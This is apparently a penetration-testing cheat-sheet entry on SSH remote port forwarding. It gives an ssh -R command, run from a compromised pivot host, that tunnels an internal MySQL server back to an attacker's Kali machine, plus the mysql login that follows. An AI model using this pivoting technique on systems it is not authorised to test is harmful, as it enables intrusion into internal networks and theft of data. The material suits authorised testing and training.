---
title: SSH Remote Port Forwarding (-R)
category: tunnels
subcategory: ssh
os: linux, windows
command: ssh -N -R kalilisten:dest:destport user@kali
tools: ssh
---


Useful when only outbound SSH from the victim is allowed.

### Forward a service from inside the network back to Kali

On the compromised pivot:

```bash
ssh -N -R 127.0.0.1:3456:10.8.20.130:3306 kali@192.168.118.12
```

On Kali listen on `localhost:3456`, packets travel back through the tunnel to the pivot, then on to `DBMASTER:3306`.

### Use it

```bash
mysql -h 127.0.0.1 -P 3456 -u dbroot -p
```
